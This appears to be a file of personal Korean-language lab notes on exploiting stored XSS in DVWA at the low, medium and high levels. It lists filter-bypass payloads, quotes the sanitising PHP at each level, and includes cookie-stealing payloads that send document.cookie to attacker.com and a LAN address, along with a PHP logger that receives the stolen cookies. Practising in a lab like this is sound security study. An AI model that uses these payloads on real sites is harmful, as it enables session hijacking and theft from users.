@@ -1,0 +1,241 @@
+댓글인가?
+ 
+LOW
+
+제목은 칸수 제한있어서 안들어가지만  
+버프슈트로 넣어서 보내면 제목으로도 된다. 
+
+내용부분에 
+<script>alert('XSS');</script> 입력. 성공
+
+제목에 넣으면 두번 발동되네? 
+
+ 동작 확인
+이 공격은 입력값이 서버에 저장되고,
+
+다음에 페이지를 볼 때 그 값이 HTML로 렌더링되면서 그대로 실행되기 때문에
+
+다른 사용자가 접속하더라도 XSS에 감염될 수 있어.
+
+
+추가 실험 (보안 필터 없는지 확인)
+<img src=x onerror=alert('imgXSS')>
+변형도 잘 작동됨.
+
+<script>alert(document.cookie)</script> 쿠키 노출
+security=low; PHPSESSID=7ccavag3vcma7l472qs6o86ru6
+
+
+이게 관리자 페이지나 게시판이라면?
+
+<script>fetch('http://attacker.com/steal?c='+document.cookie)</script> 
+같은 스크립트로 쿠키 탈취 → 세션 탈취 가능
+
+
+MIDIUM
+
+입력값 : <scr<script>ipt>alert('xss')</scr<script>ipt>
+
+Name: 123
+Message: alert(\'xss\')
+
+<scr<script>ipt>...</scr<script>ipt>라는 우회 페이로드를 넣었음
+
+하지만 출력에선 HTML 태그는 사라지고,
+스크립트 안의 내용만 텍스트 형태로 출력됨
+
+그리고 작은따옴표 '가 \'로 이스케이프되어 있음
+
+str_replace('<script>', '', $input); // <script> 제거
+htmlspecialchars($input);            // HTML 특수문자 이스케이프
+addslashes($input);                 // ' 를 \' 로 바꿈
+
+안되네...
+🔹 message (댓글) 처리 부분:
+php
+$message = strip_tags( addslashes( $message ) );
+$message = mysqli_real_escape_string(..., $message);
+$message = htmlspecialchars( $message );
+
+🔹 name (작성자 이름) 처리 부분:
+php
+$name = str_replace('<script>', '', $name);
+$name = mysqli_real_escape_string(..., $name);
+🧨 여기서 어떤 보안 조치가 있나?
+
+처리 함수	설명	효과
+strip_tags()	모든 HTML 태그 제거	XSS 완전 제거
+addslashes()	', ", \, NULL 앞에 \ 추가	SQL Injection 방지용
+mysqli_real_escape_string()	SQL 특수문자 이스케이프	SQL Injection 방지
+htmlspecialchars()	<, >, &, " → HTML 이스케이프	브라우저에서 HTML 무력화
+
+message 필드는 절대 XSS 우회 불가
+strip_tags()가 모든 태그 제거
+
+htmlspecialchars()가 남은 문자를 HTML로 못 보이게 바꿈
+
+즉, <script>, <img>, <svg> 전부 제거되고
+남은 게 있어도 이스케이프돼서 브라우저가 절대 실행 못 함
+
+하지만 name 필드는 약점이 있다. 
+
+$name = str_replace('<script>', '', $name);
+단순히 <script>만 지우는 방식이라면,
+<ScRiPt>, <script >, <script\n> 같은 우회가 통할 수 있음
+
+단, 출력 시 어떻게 보여주는지 코드에 없어 판단 불가
+→ 만약 name도 htmlspecialchars() 처리된다면 여기서도 불가능
+
+대소문자 우회.
+<ScRiPt>alert('XSS')</ScRiPt>
+성공.
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+중간 삽입형 우회.
+<script> 부분만 제거돼서 결과적으로 <script>alert('XSS')</script> 가 됨
+공백/속성 삽입 우회
+<script >alert(1)</script >
+<script >는 <script>와 다르다고 인식될 수 있음
+
+태그 없는 벡터
+<img src=x onerror=alert(1)>
+<script> 자체를 사용하지 않기 때문에 필터 우회
+성공.
+
+XSS의 종결 공격: 세션 하이재킹
+✅ 목표
+브라우저에 저장된 쿠키 정보를 공격자의 서버로 빼돌리는 것
+
+이 쿠키 안에 세션 토큰이 있으면 → 피해자의 로그인 상태를 공격자가 탈취
+
+🧪 예시: 쿠키 탈취 스크립트
+html
+복사
+편집
+<script>
+fetch('http://yourserver.com/steal?c=' + document.cookie);
+</script>
+또는 구버전 브라우저에서는:
+
+html
+복사
+편집
+<img src="http://yourserver.com/steal?c='+document.cookie">
+이렇게 하면 피해자의 브라우저가 자신의 쿠키 정보를 공격자의 서버로 요청을 보내면서 유출시켜버려.
+
+📥 서버 측 준비 (공격자 서버)
+PHP 예시:
+php
+복사
+편집
+<?php
+file_put_contents("log.txt", $_GET['c'] . "\n", FILE_APPEND);
+?>
+http://yourserver.com/steal.php 로 요청이 오면 c 파라미터로 쿠키 정보 저장됨
+
+🔒 실전 방어 포인트
+공격	방어 방법
+document.cookie 탈취	HttpOnly 속성으로 JS 접근 차단
+외부로 전송	CSP(Content-Security-Policy)로 외부 요청 제한
+스크립트 실행 자체 차단	XSS 필터링 + Output Encoding + WAF 등
+
+💡 참고
+세션 쿠키가 HttpOnly면 JavaScript로는 읽을 수 없기 때문에 안전해
+
+그래서 보안이 좋은 사이트는 document.cookie가 XSS 있어도 탈취 안 돼
+
+하지만 HttpOnly 설정 안 되어 있거나, 인증 토큰이 localStorage에 있으면 → 그대로 털림
+
+high
+메세지 필드는 여전히 강력하고 
+$message = strip_tags( addslashes( $message ) );
+$message = mysqli_real_escape_string(..., $message);
+$message = htmlspecialchars( $message );
+→ 요약:
+strip_tags() → 모든 HTML 태그 제거
+
+htmlspecialchars() → <, > 같은 특수문자 이스케이프
+
+✅ XSS 완전 차단됨
+이름필드는 정규식 기반으로 필터링.
+
+🔸 이름 필드 ($name)
+php
+복사
+편집
+$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
+→ 요약:
+<script> 관련 태그만 정규식으로 제거
+
+나머지 태그는 살아 있음
+
+✅ 여기가 우회 지점이다 😈
+
+
+
+우회 아이디어 (name 필드에 넣기)
+✅ 1. img 태그 이용
+html
+복사
+편집
+<img src=x onerror=alert(1)>
+<script>는 차단하지만 <img>는 차단 안 함
+
+onerror 이벤트는 이미지 로딩 실패 시 실행됨 → XSS 
+성공.
+
+svg 태그 이용
+html
+<svg onload=alert(1)>
+
+<svg>도 <script>가 아니므로 필터 안됨
+
+
+ 3. 자바스크립트 인코딩 (필터 우회)
+html
+복사
+편집
+<scr<script>ipt>alert(1)</scr<script>ipt>
+<script>가 정규식으로 걸리면 중간에만 제거됨 → 복원 가능
+
+실패.
+
+ 4. 정규식 취약점 우회 (태그 아닌 형태)
+html
+복사
+편집
+<scri<script>pt>alert(1)</scri<script>pt>
+정규식은 /<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i라서
+중간에 <나 공백을 껴도 탐지 못함.
+
+이것도 안됨.
+
+☠️ 1. 쿠키 탈취용 XSS 페이로드
+공격자 서버로 쿠키 전송
+html
+복사
+편집
+<img src=x onerror="location.href='http://attacker.com/steal.php?c='+document.cookie">
+onerror 이벤트에서 JavaScript 실행
+
+location.href를 사용해 피해자 브라우저가 공격자 서버로 강제 이동
+
+그 이동 URL에 쿠키 값이 포함
+
+☁️ 2. 공격자 서버: 쿠키 수신 스크립트 (PHP 예시)
+php
+복사
+편집
+<?php
+file_put_contents("log.txt", $_GET['c'] . "\n", FILE_APPEND);
+?>
+http://attacker.com/steal.php 라는 주소에서 ?c=쿠키값 으로 들어오면
+
+쿠키값을 log.txt에 누적 저장
+
+
+<img src=x onerror="location.href='http://attacker.com/steal.php?c='+document.cookie">
+
+<img src=x onerror="new Image().src='http://192.168.0.239:8000/?c='+document.cookie">
+
+
+<img src=x onerror="fetch('http://192.168.0.239:8000/?c='+document.cookie)">
